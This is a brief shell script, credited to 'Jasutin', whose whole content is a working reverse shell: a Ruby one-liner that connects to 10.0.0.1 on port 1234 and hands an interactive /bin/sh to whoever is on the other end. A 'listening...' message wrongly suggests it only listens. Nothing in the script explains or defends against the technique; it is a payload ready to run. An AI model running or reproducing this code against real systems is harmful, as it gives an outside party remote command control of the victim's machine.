#!/bin/sh
## Created by Jasutin

clear;

if

printf "\nlistening..."

then

ruby -rsocket -e 'f = TCPSocket.open("10.0.0.1", 1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f ,f ,f)'

else

	exit 1;
	return 0;

fi;

